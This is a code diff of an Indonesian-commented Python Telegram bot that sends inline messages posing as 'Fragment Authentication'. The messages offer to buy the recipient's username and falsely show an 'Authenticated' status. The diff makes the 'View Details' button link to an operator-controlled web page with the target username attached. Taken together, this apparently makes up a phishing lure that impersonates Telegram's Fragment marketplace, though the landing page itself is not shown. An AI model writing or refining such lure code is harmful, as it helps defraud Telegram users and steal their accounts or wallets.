@@ -5,13 +5,12 @@ from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update, InlineQ
 from telegram.ext import Application, CommandHandler, InlineQueryHandler, CallbackQueryHandler, ContextTypes
 import uuid
 import hashlib
-import urllib.parse # Pertahankan import yang mungkin dibutuhkan di fungsi lain atau di masa depan
 
 # Configuration
 BOT_TOKEN = os.getenv('BOT_TOKEN', '').strip()
 AUTH_CODE = os.getenv('AUTH_CODE', '1234').strip()
 PORT = int(os.getenv('PORT', 8443))
-WEBHOOK_URL = os.getenv('WEBHOOK_URL', '').strip() # Nilai WEBHOOK_URL akan digunakan
+WEBHOOK_URL = os.getenv('WEBHOOK_URL', '').strip()
 
 # Setup logging
 logging.basicConfig(
@@ -27,8 +26,17 @@ def generate_unique_id(user_id: int, query: str) -> str:
 
 def escape_username(username: str) -> str:
     """Escape karakter khusus untuk menghindari masalah formatting"""
-    # Ganti underscore dengan underscore + zero-width space untuk menghindari italic
     return username.replace('_', '_​')  # underscore + zero-width space
+
+def generate_details_url(username: str) -> str:
+    """Generate URL untuk view details"""
+    if WEBHOOK_URL:
+        # Encode username untuk URL
+        import urllib.parse
+        encoded_username = urllib.parse.quote(username)
+        return f"{WEBHOOK_URL}/details?username={encoded_username}"
+    else:
+        return f"https://example.com/details?username={username}"
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handler untuk command /start"""
@@ -47,7 +55,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"3. Bot akan kirim offer untuk username tersebut\n\n"
         f"**Format:** `@{bot_username} [kode] [username]`\n"
         f"**Kode auth:** `{AUTH_CODE}`\n\n"
-        "✅ **Support:** Username dengan underscore (_) didukung penuh"
+        "🔗 **View Details:** Akan membuka halaman web dengan detail lengkap"
     )
     
     try:
@@ -83,35 +91,30 @@ async def handle_inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE
         # Escape username untuk menghindari masalah formatting
         escaped_username = escape_username(target_username)
         
-        # Hash username untuk ID unik (dipertahankan dari kode lama, meskipun callback data sudah dihapus)
-        username_hash = hashlib.md5(target_username.encode()).hexdigest()
+        # Generate URL untuk view details
+        details_url = generate_details_url(target_username)
         
-        # Tentukan URL untuk tombol "View Details"
-        # Gunakan WEBHOOK_URL secara langsung tanpa parameter tambahan
-        details_url = WEBHOOK_URL 
-        
-        # Format pesan dengan HTML parsing untuk kontrol yang lebih baik
+        # Format pesan dengan HTML parsing
         message_text = (
             "🔐 <b>Fragment Authentication</b>\n\n"
             f"Direct offer to sell your username: <code>{target_username}</code>\n\n"
             f"<b>Status:</b> ✅ Authenticated\n"
-            f"<b>Target:</b> {escaped_username}"
+            f"<b>Target:</b> {escaped_username}\n\n"
+            f"<i>Click 'View Details' for more information</i>"
         )
         
         results.append(
             InlineQueryResultArticle(
-                id=generate_unique_id(user_id, f"correct_{username_hash}"),
+                id=generate_unique_id(user_id, f"correct_{target_username}"),
                 title="✅ FRAGMENT AUTHENTICATION",
                 description=f"Offer for: {target_username}",
                 input_message_content=InputTextMessageContent(
                     message_text=message_text,
-                    parse_mode="HTML"  # Gunakan HTML untuk formatting yang lebih terkontrol
+                    parse_mode="HTML"
                 ),
                 reply_markup=InlineKeyboardMarkup([
-                    # PERUBAHAN UTAMA: Menggunakan url=details_url (WEBHOOK_URL)
-                    # dan menambahkan tombol close untuk mempertahankan fitur lama
                     [InlineKeyboardButton("📋 View Details", url=details_url)],
-                    [InlineKeyboardButton("❌ Close", callback_data="close")] # Tombol close dipertahankan menggunakan callback data
+                    [InlineKeyboardButton("❌ Close", callback_data="close")]
                 ])
             )
         )
@@ -174,8 +177,7 @@ async def handle_inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE
                         f"<b>Examples:</b>\n"
                         f"• @username_bot {AUTH_CODE} Sui_panda\n"
                         f"• @username_bot {AUTH_CODE} John_Doe\n"
-                        f"• @username_bot {AUTH_CODE} Alice_Smith\n"
-                        f"• @username_bot {AUTH_CODE} test_user_123"
+                        f"• @username_bot {AUTH_CODE} Alice_Smith"
                     ),
                     parse_mode="HTML"
                 )
@@ -189,12 +191,7 @@ async def handle_inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE
         logger.error(f"Error answering inline query: {e}")
 
 async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """
-    Handler untuk tombol callback.
-    Fungsi ini dipertahankan secara keseluruhan, hanya menyesuaikan callback_data yang relevan.
-    Karena tombol 'View Details' sudah diubah menjadi URL,
-    kita hanya perlu mempertahankan logic untuk 'close'.
-    """
+    """Handler untuk tombol callback - hanya handle close sekarang"""
     if not update.callback_query:
         return
         
@@ -206,9 +203,6 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except error.TelegramError as e:
         logger.error(f"Error answering callback: {e}")
         return
-    
-    # Logic callback data lama untuk 'details_' dan 'back_' dihapus/dinonaktifkan
-    # karena tombol 'View Details' sekarang adalah URL eksternal.
     
     if query.data == "close":
         try:
@@ -228,7 +222,6 @@ def main():
         
     logger.info(f"Starting Fragment Authentication Bot")
     logger.info(f"AUTH_CODE: {AUTH_CODE}")
-    # Tambahkan logging WEBHOOK_URL untuk verifikasi
     logger.info(f"WEBHOOK_URL: {WEBHOOK_URL}")
 
     application = Application.builder().token(BOT_TOKEN).build()
